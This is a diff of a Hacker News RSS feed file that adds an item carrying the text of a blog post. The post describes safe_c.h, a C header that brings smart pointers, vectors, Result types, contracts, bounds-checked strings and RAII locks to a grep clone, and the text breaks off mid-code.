@@ -4,12 +4,531 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Mon, 17 Nov 2025 13:30:01 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 17 Nov 2025 14:30:05 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[Building a Simple Search Engine That Works (166 pts)]]></title>
+            <title><![CDATA[Giving C a Superpower (108 pts)]]></title>
+            <link>https://hwisnu.bearblog.dev/giving-c-a-superpower-custom-header-file-safe_ch/</link>
+            <guid>45952428</guid>
+            <pubDate>Mon, 17 Nov 2025 10:40:55 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://hwisnu.bearblog.dev/giving-c-a-superpower-custom-header-file-safe_ch/">https://hwisnu.bearblog.dev/giving-c-a-superpower-custom-header-file-safe_ch/</a>, See on <a href="https://news.ycombinator.com/item?id=45952428">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div>
+    
+
+    
+
+    
+        
+
+        <p>
+            <i>
+                <time datetime="2025-11-09T15:47Z">
+    09 Nov, 2025
+</time>
+            </i>
+        </p>
+    
+
+    <p><em>The story of how I wrote a leak-free, thread-safe grep in C23 without shooting yourself in the foot, and how you can too!</em></p>
+<h2 id="introduction">Introduction</h2><p>Let's be honest: most people have a love-hate relationship with C. We love its raw speed, its direct connection to the metal, and its elegant simplicity. But we hate its footguns, its dragons, the untamed beasts. The segfaults that appear from nowhere, the memory leaks that slowly drain the life from our applications, and the endless goto cleanup; chains that make our code look like a plate of spaghetti pasta.</p>
+<p>This is the classic C curse: power without guardrails...at least that's the <em>fear mongering mantra</em> being said again and again. But is that still relevant in today's world with all the tools available for C devs like static analyzer and dynamic sanitizers? I've written about this <a href="https://hwisnu.bearblog.dev/make-c-safe-again/" target="_blank">here</a> and <a href="https://hwisnu.bearblog.dev/debunking-the-unsafe-c-myths-part-2/" target="_blank">here</a>.</p>
+<p>What if, with the help of the modern tools and a custom header file (600 loc), you could tame those footguns beasts? What if you could keep C's power but wrap it in a suit of modern armor? That's what the custom header file safe_c.h is for. It's designed to give C some <mark>safety and convenience features from C++ and Rust</mark>, and I'm using it to build a high-performance grep clone called cgrep as my test case.</p>
+<p>By the end this article I hope it could provide the audience with the idea of C is super flexible and extensible, sort of <em>"do whatever you want with it"</em> kind of thing. And this is why C (and its close cousin: Zig) remain to be my favorite language to write programs in; it's the language of freedom!</p>
+<h2 id="safe_ch">safe_c.h</h2><p>Is a custom C header file that takes features mainly from C++ and Rust and implements them into our C code ~ [write C code, get C++ and Rust features!]</p>
+<p>It starts by bridging the gap between old and new C. C23 gave us <code>[[cleanup]]</code> attributes, but in the real world, you need code that compiles on GCC 11 or Clang 18. safe_c.h detects your compiler and gives you the same RAII semantics everywhere. No more <code>#ifdef</code> soup.</p>
+<div><pre><span></span>// The magic behind CLEANUP: zero overhead, maximum safety
+#if defined(__STDC_VERSION__) &amp;&amp; __STDC_VERSION__ &gt;= 202311L
+#define CLEANUP(func) [[cleanup(func)]]
+#else
+#define CLEANUP(func) __attribute__((cleanup(func)))
+#endif
+
+// Branch prediction that actually matters in hot paths
+#ifdef __GNUC__
+#define LIKELY(x)   __builtin_expect(!!(x), 1)
+#define UNLIKELY(x) __builtin_expect(!!(x), 0)
+#else
+#define LIKELY(x)   (x)
+#define UNLIKELY(x) (x)
+#endif
+</pre></div>
+<p>Your cleanup code runs even if you return early, goto out, or panic. It's <code>finally</code>, but for C.</p>
+<h2 id="the-memory-management-beast-slain-with-smart-pointers-c-feature">The Memory Management Beast: Slain with Smart Pointers (C++ feature)</h2><p>The oldest, fiercest and most feared by devs: manual memory management.</p>
+<p>Before: the highway path to leaks.<br>
+Forgetting a single <code>free()</code> is a disaster. In cgrep, parsing command-line options the old way is a breeding ground for CVEs and its bestiary. You have to remember to free the memory on every single exit path, difficult for the undisciplined.</p>
+<div><pre><span></span><span>// The Old Way (don't do this)</span>
+<span>char</span><span>*</span><span> </span><span>include_pattern</span><span> </span><span>=</span><span> </span><span>NULL</span><span>;</span>
+<span>if</span><span> </span><span>(</span><span>optarg</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>include_pattern</span><span> </span><span>=</span><span> </span><span>strdup</span><span>(</span><span>optarg</span><span>);</span>
+<span>}</span>
+<span>// ...200 lines later...</span>
+<span>if</span><span> </span><span>(</span><span>some_error</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>include_pattern</span><span>)</span><span> </span><span>free</span><span>(</span><span>include_pattern</span><span>);</span><span> </span><span>// Did I free it? Did I??</span>
+<span>    </span><span>return</span><span> </span><span>1</span><span>;</span>
+<span>}</span>
+<span>// And remember to free it at *every* return path...</span>
+</pre></div>
+<p>After: memory that <strong>automatically</strong> cleans itself up.<br>
+UniquePtr is a "smart pointer" that owns a resource. When the UniquePtr variable goes out of scope, its resource is automatically freed. It's impossible to forget.</p>
+<p>Here's the machinery inside <code>safe_c.h</code>:</p>
+<div><pre><span></span>// The UniquePtr machinery: a struct + automatic cleanup
+typedef struct {
+    void* ptr;
+    void (*deleter)(void*);
+} UniquePtr;
+
+#define AUTO_UNIQUE_PTR(name, ptr, deleter) \
+    UniquePtr name CLEANUP(unique_ptr_cleanup) = UNIQUE_PTR_INIT(ptr, deleter)
+
+static inline void unique_ptr_cleanup(UniquePtr* uptr) {
+    if (uptr &amp;&amp; uptr-&gt;ptr &amp;&amp; uptr-&gt;deleter) {
+        uptr-&gt;deleter(uptr-&gt;ptr);
+        uptr-&gt;ptr = NULL;
+    }
+}
+</pre></div>
+<p>And here's how cgrep uses it. The cleanup is automatic, even if errors happen:</p>
+<div><pre><span></span><span>// In cgrep, we use this for command-line arguments</span>
+<span>AUTO_UNIQUE_PTR</span><span>(</span><span>include_pattern_ptr</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>options_string_deleter</span><span>);</span>
+
+<span>// When we get a new pattern, the old one is automatically freed!</span>
+<span>unique_ptr_delete</span><span>(</span><span>&amp;</span><span>include_pattern_ptr</span><span>);</span>
+<span>include_pattern_ptr</span><span>.</span><span>ptr</span><span> </span><span>=</span><span> </span><span>strdup</span><span>(</span><span>optarg</span><span>);</span>
+<span>// No leaks, even if an error happens later!</span>
+</pre></div>
+<p><strong>Sharing Safely with SharedPtr</strong></p>
+<p>Before: manual, bug-prone reference counting.<br>
+You'd have to implement reference counting by hand, creating a complex and fragile system where a single mistake leads to a leak or a use-after-free bug.</p>
+<div><pre><span></span><span>// The old way of manual reference counting</span>
+<span>typedef</span><span> </span><span>struct</span><span> </span><span>{</span>
+<span>    </span><span>MatchStore</span><span>*</span><span> </span><span>store</span><span>;</span>
+<span>    </span><span>int</span><span> </span><span>ref_count</span><span>;</span>
+<span>    </span><span>pthread_mutex_t</span><span> </span><span>mutex</span><span>;</span>
+<span>}</span><span> </span><span>SharedStore</span><span>;</span>
+
+<span>void</span><span> </span><span>release_store</span><span>(</span><span>SharedStore</span><span>*</span><span> </span><span>s</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>pthread_mutex_lock</span><span>(</span><span>&amp;</span><span>s</span><span>-&gt;</span><span>mutex</span><span>);</span>
+<span>    </span><span>s</span><span>-&gt;</span><span>ref_count</span><span>--</span><span>;</span>
+<span>    </span><span>bool</span><span> </span><span>is_last</span><span> </span><span>=</span><span> </span><span>(</span><span>s</span><span>-&gt;</span><span>ref_count</span><span> </span><span>==</span><span> </span><span>0</span><span>);</span>
+<span>    </span><span>pthread_mutex_unlock</span><span>(</span><span>&amp;</span><span>s</span><span>-&gt;</span><span>mutex</span><span>);</span>
+
+<span>    </span><span>if</span><span> </span><span>(</span><span>is_last</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>match_store_deleter</span><span>(</span><span>s</span><span>-&gt;</span><span>store</span><span>);</span>
+<span>        </span><span>free</span><span>(</span><span>s</span><span>);</span>
+<span>    </span><span>}</span>
+<span>}</span>
+</pre></div>
+<p>After: automated reference counting.<br>
+SharedPtr automates this entire process. The last thread to finish using the object automatically triggers its destruction.
+The machinery:</p>
+<div><pre><span></span>// The SharedPtr machinery: reference counting without the boilerplate
+typedef struct {
+    void* ptr;
+    void (*deleter)(void*);
+    size_t* ref_count;
+} SharedPtr;
+
+#define AUTO_SHARED_PTR(name) \
+    SharedPtr name CLEANUP(shared_ptr_cleanup) = {.ptr = NULL, .deleter = NULL, .ref_count = NULL}
+
+static inline void shared_ptr_cleanup(SharedPtr* sptr) {
+    shared_ptr_delete(sptr); // Decrement and free if last reference
+}
+</pre></div>
+<p>The usage is clean and safe. No more manual counting.</p>
+<div><pre><span></span><span>// In our thread worker context, multiple threads access the same results store</span>
+<span>typedef</span><span> </span><span>struct</span><span> </span><span>{</span>
+<span>    </span><span>// ...</span>
+<span>    </span><span>SharedPtr</span><span> </span><span>store</span><span>;</span><span>  </span><span>// No more worrying about who frees this!</span>
+<span>    </span><span>SharedPtr</span><span> </span><span>file_counts</span><span>;</span>
+<span>    </span><span>// ...</span>
+<span>}</span><span> </span><span>FileWorkerContext</span><span>;</span>
+
+<span>// In main(), we create it once and share it safely</span>
+<span>// SharedPtr: Reference-counted stores for thread-safe sharing</span>
+<span>SharedPtr</span><span> </span><span>store_shared</span><span> </span><span>=</span><span> </span><span>{</span><span>0</span><span>};</span>
+<span>shared_ptr_init</span><span>(</span><span>&amp;</span><span>store_shared</span><span>,</span><span> </span><span>store_ptr</span><span>.</span><span>ptr</span><span>,</span><span> </span><span>match_store_deleter</span><span>);</span>
+<span>// Pass to threads: ctx-&gt;store = shared_ptr_copy(&amp;store_shared);</span>
+<span>// ref-count increments automatically; last thread out frees it.</span>
+</pre></div>
+<h2 id="the-buffer-overflow-beast-contained-with-vectors-and-views-c-feature">The Buffer Overflow Beast: Contained with Vectors and Views (C++ feature)</h2><p>Dynamically growing arrays in C is a horror show.</p>
+<p>Before: the realloc dance routine.<br>
+You have to manually track capacity and size, and every realloc risks fragmenting memory or failing, requiring careful error handling for every single element you add.</p>
+<div><pre><span></span><span>// The old way: manual realloc is inefficient and complex</span>
+<span>MatchEntry</span><span>**</span><span> </span><span>matches</span><span> </span><span>=</span><span> </span><span>NULL</span><span>;</span>
+<span>size_t</span><span> </span><span>matches_count</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span>
+<span>size_t</span><span> </span><span>matches_capacity</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span>
+
+<span>for</span><span> </span><span>(</span><span>/*...each match...*/</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>matches_count</span><span> </span><span>&gt;=</span><span> </span><span>matches_capacity</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>matches_capacity</span><span> </span><span>=</span><span> </span><span>(</span><span>matches_capacity</span><span> </span><span>==</span><span> </span><span>0</span><span>)</span><span> </span><span>?</span><span> </span><span>8</span><span> </span><span>:</span><span> </span><span>matches_capacity</span><span> </span><span>*</span><span> </span><span>2</span><span>;</span>
+<span>        </span><span>MatchEntry</span><span>**</span><span> </span><span>new_matches</span><span> </span><span>=</span><span> </span><span>realloc</span><span>(</span><span>matches</span><span>,</span><span> </span><span>matches_capacity</span><span> </span><span>*</span><span> </span><span>sizeof</span><span>(</span><span>MatchEntry</span><span>*</span><span>));</span>
+<span>        </span><span>if</span><span> </span><span>(</span><span>!</span><span>new_matches</span><span>)</span><span> </span><span>{</span>
+<span>            </span><span>free</span><span>(</span><span>matches</span><span>);</span><span> </span><span>// Don't leak!</span>
+<span>            </span><span>/* handle error */</span>
+<span>        </span><span>}</span>
+<span>        </span><span>matches</span><span> </span><span>=</span><span> </span><span>new_matches</span><span>;</span>
+<span>    </span><span>}</span>
+<span>    </span><span>matches</span><span>[</span><span>matches_count</span><span>++</span><span>]</span><span> </span><span>=</span><span> </span><span>current_match</span><span>;</span>
+<span>}</span>
+</pre></div>
+<p>After: a type-safe, auto-growing vector.<br>
+safe_c.h generates an entire type-safe vector for you. It handles allocation, growth, and cleanup automatically.
+The magic that generates the vector:</p>
+<div><pre><span></span>// The magic that generates a complete vector type from a single line
+#define DEFINE_VECTOR_TYPE(name, type) \
+    typedef struct { \
+        Vector base; \
+        type* data; \
+    } name##Vector; \
+    \
+    static inline bool name##_vector_push_back(name##Vector* vec, type value) { \
+        bool result = vector_push_back(&amp;vec-&gt;base, &amp;value); \
+        vec-&gt;data = (type*)vec-&gt;base.data; /* Sync pointer after potential realloc */ \
+        return result; \
+    } \
+    \
+    static inline bool name##_vector_reserve(name##Vector* vec, size_t new_capacity) { \
+        bool result = vector_reserve(&amp;vec-&gt;base, new_capacity); \
+        vec-&gt;data = (type*)vec-&gt;base.data; /* Sync pointer after potential realloc */ \
+        return result; \
+    } \
+
+
+    /* more helper functions not outlined here */
+
+// And the underlying generic Vector implementation
+typedef struct {
+    size_t size;
+    size_t capacity;
+    void* data;
+    size_t element_size;
+} Vector;
+</pre></div>
+<p>Using it in cgrep is simple and safe. The vector cleans itself up when it goes out of scope.</p>
+<div><pre><span></span><span>// Type-safe vector for collecting matches</span>
+<span>DEFINE_VECTOR_TYPE</span><span>(</span><span>MatchEntryPtr</span><span>,</span><span> </span><span>MatchEntry</span><span>*</span><span>)</span>
+
+<span>AUTO_TYPED_VECTOR</span><span>(</span><span>MatchEntryPtr</span><span>,</span><span> </span><span>all_matches_vec</span><span>);</span>
+<span>MatchEntryPtr_vector_reserve</span><span>(</span><span>&amp;</span><span>all_matches_vec</span><span>,</span><span> </span><span>store</span><span>-&gt;</span><span>total_matches</span><span>);</span>
+
+<span>// Pushing elements is safe and simple</span>
+<span>for</span><span> </span><span>(</span><span>MatchEntry</span><span>*</span><span> </span><span>entry</span><span> </span><span>=</span><span> </span><span>store</span><span>-&gt;</span><span>buckets</span><span>[</span><span>i</span><span>];</span><span> </span><span>entry</span><span>;</span><span> </span><span>entry</span><span> </span><span>=</span><span> </span><span>entry</span><span>-&gt;</span><span>next</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>MatchEntryPtr_vector_push_back</span><span>(</span><span>&amp;</span><span>all_matches_vec</span><span>,</span><span> </span><span>entry</span><span>);</span>
+<span>}</span>
+</pre></div>
+<h2 id="views-look-dont-touch-or-malloc-c-feature">Views: Look, Don't Touch (or malloc) - C++ feature</h2><p>Before: needless allocations.<br>
+To handle a substring or a slice of an array, you'd often malloc a new buffer and copy the data into it, which is incredibly slow in a tight loop.</p>
+<div><pre><span></span><span>// The old way: allocating a new string just to get a substring</span>
+<span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>line</span><span> </span><span>=</span><span> </span><span>"this is a long line of text"</span><span>;</span>
+<span>char</span><span>*</span><span> </span><span>pattern</span><span> </span><span>=</span><span> </span><span>"long line"</span><span>;</span>
+<span>// To pass just the pattern to a function, you might do this:</span>
+<span>char</span><span>*</span><span> </span><span>sub</span><span> </span><span>=</span><span> </span><span>malloc</span><span>(</span><span>strlen</span><span>(</span><span>pattern</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span>);</span>
+<span>strncpy</span><span>(</span><span>sub</span><span>,</span><span> </span><span>pattern</span><span>,</span><span> </span><span>strlen</span><span>(</span><span>pattern</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span>);</span>
+<span>// ... use sub ...</span>
+<span>free</span><span>(</span><span>sub</span><span>);</span><span> </span><span>// And hope you remember this free call</span>
+</pre></div>
+<p>After: zero-cost, non-owning views.<br>
+A StringView or a Span is just a pointer and a length. It's a non-owning reference that lets you work with slices of data without any allocation.
+The definitions are pure and simple:</p>
+<div><pre><span></span><span>// The StringView and Span definitions: pure, simple, zero-cost</span>
+<span>typedef</span><span> </span><span>struct</span><span> </span><span>{</span>
+<span>    </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>data</span><span>;</span>
+<span>    </span><span>size_t</span><span> </span><span>size</span><span>;</span>
+<span>}</span><span> </span><span>StringView</span><span>;</span>
+
+<span>typedef</span><span> </span><span>struct</span><span> </span><span>{</span>
+<span>    </span><span>void</span><span>*</span><span> </span><span>data</span><span>;</span>
+<span>    </span><span>size_t</span><span> </span><span>size</span><span>;</span>
+<span>    </span><span>size_t</span><span> </span><span>element_size</span><span>;</span>
+<span>}</span><span> </span><span>Span</span><span>;</span>
+</pre></div>
+<p>In cgrep, the search pattern becomes a StringView, avoiding allocation entirely.</p>
+<div><pre><span></span><span>// Our options struct holds a StringView, not a char*</span>
+<span>typedef</span><span> </span><span>struct</span><span> </span><span>{</span>
+<span>    </span><span>StringView</span><span> </span><span>pattern</span><span>;</span><span> </span><span>// Clean, simple, and safe</span>
+<span>    </span><span>// ...</span>
+<span>}</span><span> </span><span>GrepOptions</span><span>;</span>
+
+<span>// Initializing it is a piece of cake</span>
+<span>options</span><span>.</span><span>pattern</span><span> </span><span>=</span><span> </span><span>string_view_init</span><span>(</span><span>argv</span><span>[</span><span>optind</span><span>]);</span>
+</pre></div>
+<p>For safe array access, Span provides a bounds-checked window into existing data.</p>
+<div><pre><span></span>// safe_c.h
+#define DEFINE_SPAN_TYPE(name, type) \
+    typedef struct { \
+        type* data; \
+        size_t size; \
+    } name##Span; \
+    \
+    static inline name##Span name##_span_init(type* data, size_t size) { \
+        return (name##Span){.data = data, .size = size}; \
+    } \
+    \
+
+    /* other helper functions not outlined here */
+</pre></div>
+<div><pre><span></span><span>// Span: Type-safe array slices for chunk processing</span>
+<span>DEFINE_SPAN_TYPE</span><span>(</span><span>LineBuffer</span><span>,</span><span> </span><span>char</span><span>)</span>
+<span>LineBufferSpan</span><span> </span><span>input_span</span><span> </span><span>=</span><span> </span><span>LineBuffer_span_init</span><span>((</span><span>char</span><span>*</span><span>)</span><span>start</span><span>,</span><span> </span><span>len</span><span>);</span>
+
+<span>for</span><span> </span><span>(</span><span>size_t</span><span> </span><span>i</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>LineBuffer_span_size</span><span>(</span><span>&amp;</span><span>input_span</span><span>);</span><span> </span><span>i</span><span>++</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>char</span><span>*</span><span> </span><span>line</span><span> </span><span>=</span><span> </span><span>LineBuffer_span_at</span><span>(</span><span>&amp;</span><span>input_span</span><span>,</span><span> </span><span>i</span><span>);</span><span> </span><span>// asserts i &lt; span.size</span>
+<span>}</span>
+</pre></div>
+<h2 id="the-error-handling-codegotocode-beast-replaced-with-results-rust-feature-and-raii-c-feature">The Error-Handling <code>goto</code> Beast: Replaced with Results (Rust feature) and RAII (C++ feature)</h2><p>C's error handling is notoriously messy.</p>
+<p>Before: goto cleanup spaghetti carbonara.<br>
+Functions return special values like -1 or NULL, and you have to check errno. This leads to deeply nested if statements and a single goto cleanup; label that has to handle every possible failure case.</p>
+<div><pre><span></span><span>// The old way: goto cleanup</span>
+<span>int</span><span> </span><span>do_something</span><span>(</span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>path</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>int</span><span> </span><span>fd</span><span> </span><span>=</span><span> </span><span>open</span><span>(</span><span>path</span><span>,</span><span> </span><span>O_RDONLY</span><span>);</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>fd</span><span> </span><span>&lt;</span><span> </span><span>0</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>return</span><span> </span><span>-1</span><span>;</span><span> </span><span>// Error</span>
+<span>    </span><span>}</span>
+
+<span>    </span><span>void</span><span>*</span><span> </span><span>mem</span><span> </span><span>=</span><span> </span><span>malloc</span><span>(</span><span>1024</span><span>);</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>!</span><span>mem</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>close</span><span>(</span><span>fd</span><span>);</span><span> </span><span>// Manual cleanup</span>
+<span>        </span><span>return</span><span> </span><span>-1</span><span>;</span>
+<span>    </span><span>}</span>
+<span>    </span>
+<span>    </span><span>// ... do more work ...</span>
+
+<span>    </span><span>free</span><span>(</span><span>mem</span><span>);</span>
+<span>    </span><span>close</span><span>(</span><span>fd</span><span>);</span>
+<span>    </span><span>return</span><span> </span><span>0</span><span>;</span><span> </span><span>// Success</span>
+<span>}</span>
+</pre></div>
+<p>After: explicit, type-safe result.<br>
+Inspired by Rust, Result<t, e=""> forces you to handle errors explicitly by returning a type that is either a success value or an error value.
+The Result machinery:</t,></p>
+<div><pre><span></span>// The Result type machinery: tagged unions for success/failure
+typedef enum { RESULT_OK, RESULT_ERROR } ResultStatus;
+
+#define DEFINE_RESULT_TYPE(name, value_type, error_type) \
+    typedef struct { \
+        ResultStatus status; \
+        union { \
+            value_type value; \
+            error_type error; \
+        }; \
+    } Result##name;
+</pre></div>
+<p>Handling errors becomes easy. You can't accidentally use an error as a valid value.</p>
+<div><pre><span></span><span>// Define a Result for file operations</span>
+<span>DEFINE_RESULT_TYPE</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>i32</span><span>,</span><span> </span><span>const</span><span> </span><span>char</span><span>*</span><span>)</span>
+
+<span>// Our function now returns a clear Result</span>
+<span>static</span><span> </span><span>ResultFileOp</span><span> </span><span>submit_stat_request_safe</span><span>(...)</span><span> </span><span>{</span>
+<span>    </span><span>// ...</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>!</span><span>sqe</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>return</span><span> </span><span>RESULT_ERROR</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>"Could not get SQE for stat"</span><span>);</span>
+<span>    </span><span>}</span>
+<span>    </span><span>return</span><span> </span><span>RESULT_OK</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>0</span><span>);</span>
+<span>}</span>
+
+<span>// And handling it is clean</span>
+<span>ResultFileOp</span><span> </span><span>result</span><span> </span><span>=</span><span> </span><span>submit_stat_request_safe</span><span>(</span><span>path</span><span>,</span><span> </span><span>&amp;</span><span>ring</span><span>,</span><span> </span><span>&amp;</span><span>pending_ops</span><span>);</span>
+<span>if</span><span> </span><span>(</span><span>!</span><span>RESULT_IS_OK</span><span>(</span><span>result</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>fprintf</span><span>(</span><span>stderr</span><span>,</span><span> </span><span>"Error: %s</span><span>\n</span><span>"</span><span>,</span><span> </span><span>RESULT_UNWRAP_ERROR</span><span>(</span><span>result</span><span>));</span>
+<span>}</span>
+</pre></div>
+<p>This is powered by RAII. The <code>CLEANUP</code> attribute ensures resources are freed no matter how a function exits.</p>
+<div><pre><span></span><span>#define AUTO_MEMORY(name, size) \</span>
+<span>    void* name CLEANUP(memory_cleanup) = malloc(size)</span>
+
+<span>// DIR pointers are automatically closed, even on an early return.</span>
+<span>DIR</span><span>*</span><span> </span><span>dir</span><span> </span><span>CLEANUP</span><span>(</span><span>dir_cleanup</span><span>)</span><span> </span><span>=</span><span> </span><span>opendir</span><span>(</span><span>req</span><span>-&gt;</span><span>path</span><span>);</span>
+<span>if</span><span> </span><span>(</span><span>!</span><span>dir</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> </span><span>RESULT_ERROR</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>"Failed to open dir"</span><span>);</span><span> </span><span>// dir_cleanup is NOT called</span>
+<span>}</span>
+<span>if</span><span> </span><span>(</span><span>some_condition</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span> </span><span>RESULT_OK</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>0</span><span>);</span><span> </span><span>// closedir() is called automatically HERE!</span>
+<span>}</span>
+</pre></div>
+<h2 id="the-assumption-beast-challenged-with-contracts-and-safe-strings">The Assumption Beast: Challenged with Contracts and Safe Strings</h2><p>Before: <code>assert()</code> and pray.<br>
+A standard <code>assert(ptr != NULL)</code> is good, but when it fails, the message is generic. You know the condition failed, but not the context or why it was important.</p>
+<p>After: self-documenting contracts.<br>
+<code>requires()</code> and <code>ensures()</code> make function contracts explicit. The failure messages tell you exactly what went wrong.
+The contract macros:</p>
+<div><pre><span></span>#define requires(cond) assert_msg(cond, "Precondition failed")
+#define ensures(cond) assert_msg(cond, "Postcondition failed")
+
+#define assert_msg(cond, msg) /* ... full implementation ... */
+</pre></div>
+<p>This turns assertions into executable documentation:</p>
+<div><pre><span></span><span>// Preconditions that document and enforce contracts</span>
+<span>static</span><span> </span><span>inline</span><span> </span><span>bool</span><span> </span><span>arena_create</span><span>(</span><span>Arena</span><span>*</span><span> </span><span>arena</span><span>,</span><span> </span><span>size_t</span><span> </span><span>size</span><span>)</span>
+<span>{</span>
+<span>    </span><span>requires</span><span>(</span><span>arena</span><span> </span><span>!=</span><span> </span><span>NULL</span><span>);</span><span>  </span><span>// Precondition: arena must not be null</span>
+<span>    </span><span>requires</span><span>(</span><span>size</span><span> </span><span>&gt;</span><span> </span><span>0</span><span>);</span><span>       </span><span>// Precondition: size must be positive</span>
+<span>    </span>
+<span>    </span><span>// ... implementation ...</span>
+<span>    </span>
+<span>    </span><span>ensures</span><span>(</span><span>arena</span><span>-&gt;</span><span>buffer</span><span> </span><span>!=</span><span> </span><span>NULL</span><span>);</span><span>  </span><span>// Postcondition: buffer is allocated</span>
+<span>    </span><span>ensures</span><span>(</span><span>arena</span><span>-&gt;</span><span>size</span><span> </span><span>==</span><span> </span><span>size</span><span>);</span><span>    </span><span>// Postcondition: size is set correctly</span>
+<span>    </span>
+<span>    </span><span>return</span><span> </span><span>true</span><span>;</span>
+<span>}</span>
+</pre></div>
+<h3 id="codestrcpycode-is-a-security-vulnerability"><code>strcpy()</code> is a Security Vulnerability</h3><p>Before: buffer overflows.<br>
+strcpy has no bounds checking. It's the source of countless security holes. <code>strncpy</code> is little better, as it might not null-terminate the destination string.</p>
+<div><pre><span></span><span>// The old, dangerous way</span>
+<span>char</span><span> </span><span>dest</span><span>[</span><span>20</span><span>];</span>
+<span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>src</span><span> </span><span>=</span><span> </span><span>"This is a very long string that will overflow the buffer"</span><span>;</span>
+<span>strcpy</span><span>(</span><span>dest</span><span>,</span><span> </span><span>src</span><span>);</span><span> </span><span>// Undefined behavior! Stack corruption!</span>
+</pre></div>
+<p>After: safe, bounds-checked operations.<br>
+safe_c.h provides alternatives that check bounds and return a success/failure status. No surprises.
+The safe implementation:</p>
+<div><pre><span></span><span>// The safe string operations: bounds checking that can't be ignored</span>
+<span>static</span><span> </span><span>inline</span><span> </span><span>bool</span><span> </span><span>safe_strcpy</span><span>(</span><span>char</span><span>*</span><span> </span><span>dest</span><span>,</span><span> </span><span>size_t</span><span> </span><span>dest_size</span><span>,</span><span> </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>src</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>!</span><span>dest</span><span> </span><span>||</span><span> </span><span>dest_size</span><span> </span><span>==</span><span> </span><span>0</span><span> </span><span>||</span><span> </span><span>!</span><span>src</span><span>)</span><span> </span><span>return</span><span> </span><span>false</span><span>;</span>
+<span>    </span><span>size_t</span><span> </span><span>src_len</span><span> </span><span>=</span><span> </span><span>strlen</span><span>(</span><span>src</span><span>);</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>src_len</span><span> </span><span>&gt;=</span><span> </span><span>dest_size</span><span>)</span><span> </span><span>return</span><span> </span><span>false</span><span>;</span>
+<span>    </span><span>memcpy</span><span>(</span><span>dest</span><span>,</span><span> </span><span>src</span><span>,</span><span> </span><span>src_len</span><span> </span><span>+</span><span> </span><span>1</span><span>);</span>
+<span>    </span><span>return</span><span> </span><span>true</span><span>;</span>
+<span>}</span>
+</pre></div>
+<p>In cgrep, this prevents path buffer overflows cleanly:</p>
+<div><pre><span></span><span>// Returns bool, not silent truncation</span>
+<span>if</span><span> </span><span>(</span><span>!</span><span>safe_strcpy</span><span>(</span><span>req</span><span>-&gt;</span><span>path</span><span>,</span><span> </span><span>PATH_MAX</span><span>,</span><span> </span><span>path</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>free</span><span>(</span><span>req</span><span>);</span>
+<span>    </span><span>return</span><span> </span><span>RESULT_ERROR</span><span>(</span><span>FileOp</span><span>,</span><span> </span><span>"Path is too long"</span><span>);</span>
+<span>}</span>
+</pre></div>
+<h2 id="concurrency-mutexes-that-unlock-themselves-rust-feature">Concurrency: Mutexes That Unlock Themselves (Rust feature)</h2><p>Before: leaked locks and deadlocks.<br>
+Forgetting to unlock a mutex, especially on an error path, is a catastrophic bug that causes your program to deadlock.</p>
+<div><pre><span></span><span>// The Buggy Way</span>
+<span>pthread_mutex_lock</span><span>(</span><span>&amp;</span><span>mutex</span><span>);</span>
+<span>if</span><span> </span><span>(</span><span>some_error</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span>;</span><span> </span><span>// Oops, mutex is still locked! Program will deadlock.</span>
+<span>}</span>
+<span>pthread_mutex_unlock</span><span>(</span><span>&amp;</span><span>mutex</span><span>);</span>
+</pre></div>
+<p>After: RAII-based locks.<br>
+Using the same CLEANUP attribute, we can ensure a mutex is always unlocked when the scope is exited. This bug becomes impossible to write.</p>
+<div><pre><span></span><span>// With a cleanup function, unlocking is automatic.</span>
+<span>void</span><span> </span><span>mutex_unlock_cleanup</span><span>(</span><span>pthread_mutex_t</span><span>**</span><span> </span><span>lock</span><span>)</span><span> </span><span>{</span>
